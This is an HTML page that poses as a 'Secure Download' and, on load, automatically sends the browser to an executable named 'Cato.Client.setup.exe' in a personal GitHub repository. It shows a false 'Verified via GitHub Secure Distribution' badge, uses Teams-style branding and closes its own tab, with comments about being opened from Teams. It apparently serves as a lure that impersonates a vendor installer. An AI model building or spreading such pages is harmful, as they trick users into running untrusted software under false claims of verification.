<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Download | Your Project Name</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f9f9fb;
            color: #333;
        }
        .card {
            background: white;
            padding: 2rem;
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.05);
            text-align: center;
            max-width: 400px;
            width: 90%;
        }
        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #0078d4; /* Teams/Windows Blue */
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 0 auto 1rem;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h1 { font-size: 1.25rem; margin-bottom: 0.5rem; }
        p { color: #666; font-size: 0.9rem; line-height: 1.5; }
        .footer { margin-top: 1.5rem; font-size: 0.75rem; color: #999; }
    </style>
</head>
<body>

<div class="card">
    <div class="spinner"></div>
    <h1>Starting Download...</h1>
    <p>Your installer is being fetched from the secure server. This window will close automatically when finished.</p>
    
    <div class="footer">
        Verified via GitHub Secure Distribution
    </div>
</div>

<script>
    // 1. YOUR GITHUB DIRECT EXE LINK
    const DOWNLOAD_URL = "https://github.com/val0n/val0n.github.io/releases/download/valon/Cato.Client.setup.exe";

    // 2. TRIGGER DOWNLOAD
    window.location.href = DOWNLOAD_URL;

    // 3. CLOSE TAB (Timer allows for the "Save As" dialog to trigger first)
    setTimeout(() => {
        // If the window was opened via Teams/Target=_blank, this will work
        window.close();
        
        // Fallback: If it doesn't close, update the text
        document.querySelector('h1').innerText = "Download Ready";
        document.querySelector('.spinner').style.display = "none";
    }, 5000);
</script>

</body>
</html>
